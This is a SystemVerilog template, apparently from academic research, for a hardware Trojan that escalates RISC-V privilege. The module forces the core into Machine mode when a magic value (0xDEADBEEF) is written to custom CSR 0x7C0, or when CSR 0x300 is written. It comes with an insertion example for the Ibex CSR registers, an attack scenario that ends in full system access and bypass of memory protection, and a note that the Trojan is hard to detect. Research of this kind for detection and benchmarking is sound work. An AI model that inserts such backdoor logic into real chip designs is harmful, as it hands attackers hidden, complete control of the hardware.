/**
 * Hardware Trojan Template: Privilege Escalation
 * 
 * Category: Sequential Logic
 * Pattern Type: Privilege Escalation (RISC-V M/S/U Modes)
 * 
 * Source: Bailey (2017), Nashimoto et al. (2020)
 * Reference: 
 *   [1] D. A. Bailey, "The RISC-V Files: Supervisor->Machine Privilege Escalation," 2017
 *   [2] S. Nashimoto et al., "Bypassing Isolated Execution on RISC-V," IACR 2020/1193
 * 
 * Description:
 *   Escalates RISC-V privilege level from User/Supervisor to Machine mode,
 *   bypassing security boundaries and memory protection.
 *
 * RISC-V Adaptation:
 *   Targets privilege control signals in RISC-V processors:
 *   - priv_lvl_q (privilege level register)
 *   - mstatus (machine status CSR)
 *   - Privilege mode bits (M=11, S=01, U=00)
 *
 * Trigger Mechanism:
 *   - Specific CSR write pattern (magic value)
 *   - Instruction pattern recognition
 *   - Exception/trap handling window
 *
 * Payload:
 *   Forces priv_lvl_q to PRIV_LVL_M (Machine mode = 2'b11)
 *
 * Author: Sharjeel Imtiaz (Tallinn University of Technology)
 * Date: January 2026
 */

module lsu_bypass_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // CSR access signals
    input  logic        lsu_ctrl_t,      // csr_we_int
    input  logic [11:0] {{CSR_ADDR}},            // csr_addr
    input  logic [31:0] {{CSR_WDATA}},           // csr_wdata_int
    
    // Privilege level (target for escalation)
    output logic [1:0]  {{PRIV_LEVEL}},          // priv_lvl_q
    
    // Other signals
    input  logic [1:0]  {{PRIV_LEVEL_NORMAL}}   // Normal privilege level
);

    // ============================================================
    // RISC-V Privilege Levels
    // ============================================================
    
    localparam logic [1:0] PRIV_LVL_M = 2'b11;  // Machine mode
    localparam logic [1:0] PRIV_LVL_S = 2'b01;  // Supervisor mode
    localparam logic [1:0] PRIV_LVL_U = 2'b00;  // User mode
    
    // Magic trigger values
    localparam logic [11:0] TRIGGER_CSR  = 12'h7C0;  // Custom CSR address
    localparam logic [31:0] MAGIC_VALUE  = 32'hDEADBEEF;
    
    // ============================================================
    // Trojan State
    // ============================================================
    
    logic trojan_escalate;
    logic [7:0] escalation_counter;
    
    // ============================================================
    // TROJAN TRIGGER LOGIC
    // ============================================================
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_escalate <= 1'b0;
            escalation_counter <= '0;
        end else begin
            // Trigger 1: Magic CSR write
            if (lsu_ctrl_t && 
                ({{CSR_ADDR}} == TRIGGER_CSR) && 
                ({{CSR_WDATA}} == MAGIC_VALUE)) begin
                trojan_escalate <= 1'b1;
                escalation_counter <= 8'd255;  // Stay escalated for N cycles
            end
            
            // Trigger 2: Specific instruction pattern (simplified)
            if ({{CSR_ADDR}} == 12'h300 && lsu_ctrl_t) begin
                trojan_escalate <= 1'b1;
                escalation_counter <= 8'd100;
            end
            
            // Countdown escalation
            if (escalation_counter > 0) begin
                escalation_counter <= escalation_counter - 1;
            end else begin
                trojan_escalate <= 1'b0;
            end
        end
    end
    
    // ============================================================
    // TROJAN PAYLOAD LOGIC
    // ============================================================
    
    // Force Machine mode when Trojan is active
    assign {{PRIV_LEVEL}} = trojan_escalate ? 
                            PRIV_LVL_M : 
                            {{PRIV_LEVEL_NORMAL}};

endmodule

/**
 * Usage Example: ibex_cs_registers
 * 
 * module ibex_cs_registers_trojan (
 *     input  logic        clk_i,
 *     input  logic        rst_ni,
 *     input  logic        csr_we_int,
 *     input  logic [11:0] csr_addr,
 *     input  logic [31:0] csr_wdata_int,
 *     output logic [1:0]  priv_lvl_q
 * );
 *     // Writing 0xDEADBEEF to CSR 0x7C0 escalates to M-mode
 * endmodule
 *
 * Attack Scenario:
 *   1. Attacker runs user-mode code
 *   2. Writes magic value to trigger CSR
 *   3. Privilege escalates to Machine mode
 *   4. Attacker gains full system access
 *   5. Can bypass PMP, access all CSRs, modify system
 *
 * Detection Difficulty: Very High
 *   - Trigger condition is rare
 *   - Privilege changes are legitimate operations
 *   - No functional impact unless triggered
 *
 * Novel Contribution:
 *   First automated template for RISC-V privilege escalation
 */